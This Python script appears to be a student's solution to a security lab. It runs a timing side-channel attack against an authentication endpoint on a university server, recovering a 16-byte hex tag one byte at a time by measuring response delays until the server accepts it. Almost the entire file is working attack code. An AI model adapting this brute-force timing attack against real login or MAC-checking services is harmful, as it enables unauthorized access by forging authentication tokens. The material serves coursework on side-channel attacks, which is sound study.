import sys
import time
import urllib.request
import urllib.parse

import requests

#


def listtostring(s):
    return (''.join([str(elem) for elem in s]))

#make multiple rq & return avg response time
def avg_rsp_time(url, runs):
    total = 0
    for i in range(runs):
        #t0 = time.time()
        # make request
        response = requests.get(url)
        #t1 = time.time()
        total += response.elapsed.total_seconds() * 1000
    return total / runs





#charlist = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q',
#            'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']

charlist = ['a', 'b', 'c', 'd', 'e', 'f', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
#url = 'http://dart.cse.kau.se:12345/auth/100/axelalvi/'


delay = 100
name = "axelalvi"

url = "http://dart.cse.kau.se:12345/auth/" + str(delay) + "/" + name + "/"

hexfinnishlist = []

for i in charlist:
    for j in charlist:
        hexfinnishlist.append(f"{i}{j}")

hexlist = list(set(hexfinnishlist))
general_rsp_time = 50

while(True):

    #find first hex in tag that by checking which one gives back a response time
    temp_tag = ['00'] * 16
    longest_rsp = -100
    curr_first = ""
    for hex in hexlist:
        temp_tag[0] = hex
        tag_string = listtostring(temp_tag)
        print(tag_string)
        #response = requests.get(url + tag_string)
        rsp_time = avg_rsp_time(url + tag_string, 1)#response.elapsed.total_seconds() * 1000
        print(rsp_time)
        if(rsp_time > longest_rsp and rsp_time < (delay + general_rsp_time)):
            longest_rsp = rsp_time
            curr_first = hex
            if rsp_time > (delay + 15):
                break
    print(curr_first)
    #curr_first will now be the first hex in tag


    guessedtag = [curr_first] * 16
    besthex = ""
    wrong_guess = False

    for i in range(1,len(guessedtag)):
        #if rq_time is less than i * delay, we know we guessed wrong and want to try previous i again
        if wrong_guess is True:
            if i < 2:
                break
            i -= 2
            wrong_guess = False
        current_longest = -100
        print(f"index {i}, guessedtag: {listtostring(guessedtag)}")
        avragetime = [0] * 10
        #200 is delay
        #reasonable = 300 + (i*300)
        sweetspot_top = (i + 1) * delay + general_rsp_time
        print("sweet top: " + str(sweetspot_top))
        sweetspot_bottom = (i + 1) * delay

        minimum_rsp_time = i * delay

        for hex in hexlist:
            print(f"index {i} char: {hex} besthex: {besthex} curr_long: {current_longest}")
            guessedtag[i] = hex
            newtag = listtostring(guessedtag)
            rq_time = avg_rsp_time((url + newtag), 1)
            print(rq_time)
            if(rq_time < minimum_rsp_time):
                wrong_guess = True
                break
            if(rq_time > current_longest and rq_time < sweetspot_top):
                current_longest = rq_time
                besthex = hex
                if(current_longest > sweetspot_bottom):
                    #we found a candidate, now we want to see if it is correct by adding it to a temp guessedlist
                    #and check the response time for that list. If response time is above next minimum rsp time, we break here
                    #otherwise, the candidate was not correct and we continue looking
                    temp_list = guessedtag
                    temp_list[i] = besthex
                    temp_list_string = listtostring(temp_list)
                    temp_rq_time = avg_rsp_time((url + temp_list_string), 10)
                    next_min_rsp_time = (i + 1) * delay
                    next_max_rsp_time = ((i + 1) * delay) + delay
                    print(f"trying: {besthex} next_min: {next_min_rsp_time} temp_rq_time: {temp_rq_time} next_max: {next_max_rsp_time}")
                    if temp_rq_time > next_min_rsp_time and temp_rq_time < next_max_rsp_time:
                        break
                    else:
                        current_longest = -100
                        best_hex = ""

        guessedtag[i] = besthex



    print(listtostring(guessedtag))

    re = requests.get(url + listtostring(guessedtag))
    if str(re) == "<Response [200]>":
        print("OK!")
        break
